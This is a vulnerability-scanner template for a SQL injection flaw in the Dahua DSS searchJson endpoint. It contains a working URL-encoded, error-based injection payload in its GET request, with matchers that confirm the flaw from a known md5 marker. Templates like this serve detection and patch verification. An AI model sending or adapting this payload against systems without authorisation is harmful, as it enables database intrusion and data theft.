id: dahua-searchjson-sql-injection

info:
  name: Dahua DSS searchJson SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    There is a SQL injection vulnerability in the searchJson functionality of the Dahua DSS platform. Exploiting this vulnerability may allow attackers to retrieve sensitive database information or execute arbitrary commands.
  reference:
    - https://www.dahuatech.com/product/info/5609.html
  classification:
    cvss-score: 8.2
  tags: sql-injection

http:
  - raw:
      - |
        GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "1e469dbcb9211897b5f5ebf866c66f3"
        part: body
